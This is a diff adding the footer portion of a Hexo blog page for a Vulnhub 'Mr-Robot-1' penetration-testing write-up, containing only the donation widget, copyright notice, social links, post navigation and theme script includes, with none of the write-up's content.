+          <div class="reward-container">
+  <div>Buy me a coffee</div>
+  <button>
+    Donate
+  </button>
+  <div class="post-reward">
+      <div>
+        <img src="/images/wechatpay.png" alt="lUc1f3r11 WeChat Pay">
+        <span>WeChat Pay</span>
+      </div>
+      <div>
+        <img src="/images/alipay.png" alt="lUc1f3r11 Alipay">
+        <span>Alipay</span>
+      </div>
+
+  </div>
+</div>
+
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>Post author:  </strong>lUc1f3r11
+  </li>
+  <li class="post-copyright-link">
+      <strong>Post link: </strong>
+      <a href="https://fdlucifer.github.io/2020/01/02/Mr-Robot-1/" title="vulnhub靶机渗透[Mr-Robot-1]">https://fdlucifer.github.io/2020/01/02/Mr-Robot-1/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+          <div class="followme">
+  <span>Welcome to my other publishing channels</span>
+
+  <div class="social-list">
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://twitter.com/fdlucifer11">
+            <span class="icon">
+              <i class="fab fa-twitter"></i>
+            </span>
+
+            <span class="label">Twitter</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://t.me/FDkiller">
+            <span class="icon">
+              <i class="fab fa-telegram"></i>
+            </span>
+
+            <span class="label">Telegram</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <span class="social-link">
+            <span class="icon">
+              <i class="fab fa-weixin"></i>
+            </span>
+
+            <span class="label">WeChat</span>
+          </span>
+
+          <img class="social-item-img" src="/images/wechat_channel.jpg">
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://infosec.exchange/@lUc1f3r11">
+            <span class="icon">
+              <i class="custom mastodon"></i>
+            </span>
+
+            <span class="label">infosec.exchange</span>
+          </a>
+      </div>
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/vulnhub%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/" rel="tag"><i class="fa fa-tag"></i> vulnhub靶机练习</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2020/01/02/NullByte-1/" rel="prev" title="vulnhub靶机渗透[NullByte-1]">
+                  <i class="fa fa-chevron-left"></i> vulnhub靶机渗透[NullByte-1]
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2020/01/03/W1R3S-1-0-1/" rel="next" title="vulnhub靶机渗透[W1R3S-1-0-1]">
+                  vulnhub靶机渗透[W1R3S-1-0-1] <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 2017 – 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">lUc1f3r11</span>
+</div>
+  <div class="powered-by">Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZy9tdXNlLw==">NexT.Muse</span>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+  <span class="exturl github-corner" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="Follow me on GitHub" aria-label="Follow me on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></span>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>
+
+  
+
+
+
+  <script src="/js/third-party/pace.js"></script>
+
+  
+
+
+
+
+
+</body>
+</html>
